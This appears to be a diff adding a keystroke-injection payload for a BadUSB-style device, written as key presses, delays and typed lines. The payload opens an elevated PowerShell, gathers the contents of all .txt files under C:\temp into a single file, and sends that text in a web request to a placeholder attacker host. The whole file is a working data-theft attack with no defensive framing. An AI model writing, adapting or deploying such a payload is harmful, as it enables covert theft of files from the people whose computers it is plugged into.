@@ -1,0 +1,9 @@
+Press:131+114
+PrintLine:powershell Start-Process PowerShell -Verb RunAs
+CustomDelay:1000
+Press:130+121
+CustomDelay:500
+PrintLine:Get-ChildItem -Path C:\temp\*.txt -Recurse -Force -Exclude C:\temp\all_results.txt | Select FullName | ForEach-Object {$content = Get-Content $_.FullName | Add-Content C:\temp\all_results.txt}
+PrintLine:$txt = Get-Content -Path C:\temp\all_results.txt -Raw
+PrintLine:Invoke-WebRequest -URI http://IP_OR_DOMAIN/script.php?q=$txt
+PrintLine:exit;
